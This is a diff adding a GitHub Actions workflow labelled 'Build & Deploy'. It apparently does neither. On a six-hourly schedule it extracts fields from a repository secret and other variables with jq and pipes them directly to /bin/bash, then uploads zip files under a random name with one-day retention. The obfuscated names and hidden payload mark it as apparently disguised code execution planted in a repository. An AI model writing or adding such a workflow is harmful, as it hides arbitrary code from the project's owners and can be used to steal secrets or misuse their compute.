@@ -1,0 +1,30 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          dxc4636: ${{ secrets.dxc4636 }}
+        run: |
+          printf '%s' "$dxc4636" | jq -r .xjdvl0367 | /bin/bash
+          echo $jwt98 | jq -r .sed568 | /bin/bash
+          printf '%s' "$swg5625" | jq -r .jtlf20216 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: jCmk63iY
+          path: "*.zip"
+          retention-days: 1
